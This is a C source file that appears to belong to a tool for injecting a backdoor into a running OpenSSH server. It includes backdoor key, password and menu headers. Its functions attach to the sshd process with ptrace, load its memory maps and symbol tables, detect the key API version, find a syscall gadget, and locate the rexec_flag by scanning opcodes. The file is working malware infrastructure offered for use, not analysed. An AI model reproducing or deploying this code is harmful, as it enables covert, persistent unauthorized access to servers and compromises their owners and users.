#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <types.h>
#include <common.h>
#include <map.h>
#include <inject.h>
#include <sig.h>
#include <ptrace.h>
#include <callcache.h>
#include <util.h>
#include <elflib.h>

#include <backdoor_pubkey.h>
#include <backdoor_password.h>
#include <backdoor_menu.h>

void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
	int i;
	char sshd_path[255], proc_exe[64];

	info("you gave me pid %d\n", pid);

	ctx->pid = pid;
	ctx->debug = 0;
	_attach(ctx->pid);

	info("slurping stuff to memory..");

	// parse /proc/pid/maps
	map_init();

	ctx->num_maps = map_load_all(ctx);
	ctx->mappings = map_get();

	map_sort(ctx);

	info("loaded %d memory mappings", ctx->num_maps);

	// get full path to sshd binary from /proc/pid/exe link
	memset(sshd_path, 0, 255);
	sprintf(proc_exe, "/proc/%d/exe", ctx->pid);
	readlink(proc_exe, sshd_path, 255);
	info("sshd binary path = '%s'", sshd_path);

	// check if OpenSSH version is >= 7
	FILE *f = fopen(sshd_path, "rb");

	if (f == NULL) {
		error("could not open sshd binary ('%s')", sshd_path);
	}

	fseek(f, 0, SEEK_END);
	int sz = ftell(f);
	fseek(f, 0, SEEK_SET);

	char *sshd_buf = malloc(sz);
	fread(sshd_buf, sz, 1, f);
	fclose(f);

	ctx->uses_new_key_system = 1;

	for(i = 0; i < sz; i++) {
		if (memcmp(sshd_buf + i, "key_new: RSA_new failed", 23) == 0) {
			ctx->uses_new_key_system = 0;
			break;
		}
	}

	if (ctx->uses_new_key_system) {
		info("oh, we're dealing with an sshd that probably uses sshkey_* api..");
	}

	free(sshd_buf);

	// locate syscall instruction
	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
	info("syscall\t\t\t= \x1b[37m0x%lx", ctx->sc_addr);

	// load symtabs
	ctx->dynsym_sz = get_section(sshd_path, ".dynsym", &ctx->dynsym, &ctx->dynsym_base);
	ctx->dynstr_sz = get_section(sshd_path, ".dynstr", &ctx->dynstr, &ctx->dynstr_base);
	ctx->symtab_sz = get_section(sshd_path, ".symtab", &ctx->symtab, &ctx->symtab_base);
	ctx->strtab_sz = get_section(sshd_path, ".strtab", &ctx->strtab, &ctx->strtab_base);
	ctx->got_sz    = get_section(sshd_path, ".got",    &ctx->got,    &ctx->got_base);
    ctx->rela_sz   = get_section(sshd_path, ".rela.plt",    &ctx->rela,    &ctx->rela_base);

	// cache all call instructions in executable regions
	cache_calltable(ctx);
}

void inject_ctx_deinit(inject_ctx *ctx) {
	_detach(ctx->pid);

	free(ctx->dynsym);
	free(ctx->dynstr);
	free(ctx->symtab);
	free(ctx->strtab);
	free(ctx->got);

	free(ctx);
}

u64 inject_resolve_rexec(inject_ctx *ctx) {
	u64 rexec_flag = resolve_symbol_tab(ctx, "rexec_flag");

	if (rexec_flag == 0) {
		u64 rexec_debug_lea = 0, rexec_test = 0;
		u32 rexec_flag_offset = 0;

		if (ctx->debug)
			info("could not resolve rexec_flag :(, trying alternative method..");

		rexec_debug_lea = lea_by_debugstr(
			ctx, LEA_RDI, "Server will not fork when running in debugging mode."
		);

		// find first call to getpid() from here
		u64 p_getpid = plt_by_name(ctx, "getpid");

		if (ctx->debug)
			info("getpid@plt = 0x%lx", p_getpid);

		u64 adr = find_nearest_call(rexec_debug_lea, p_getpid);

		// next opcode is "cmp cs:???, 0 ?
		unsigned char opbytes[2];
		_peek(ctx->pid, adr+5, opbytes, 2);

		if (memcmp(opbytes, "\x83\x3d", 2) == 0) {
			if (ctx->debug)
				info("found cmp:cs opcode..");

			_peek(ctx->pid, adr+5+2, &rexec_flag_offset, 4);
			rexec_flag = adr+5+7+rexec_flag_offset;
		} else { // finally.. old method
			if (ctx->debug)
				info("trying final method..");

			// Find the first 'test eax, eax' instruction after the debug string
			rexec_test = find_next_opcode(ctx, rexec_debug_lea, (u8*)"\x85\xc0", 2);

			// Get the rexec_flag offset from rip
			_peek(ctx->pid, rexec_test - 4, &rexec_flag_offset, 4);

			// Resolve absolute address of rip + rexec_flag_offset
			rexec_flag = rexec_test + rexec_flag_offset;
		}
	}

	return rexec_flag;
}

void inject_ctx_map_reload(inject_ctx *ctx) {
	map_init();
	ctx->num_maps = map_load_all(ctx);
	ctx->mappings = map_get();
	map_sort(ctx);
}
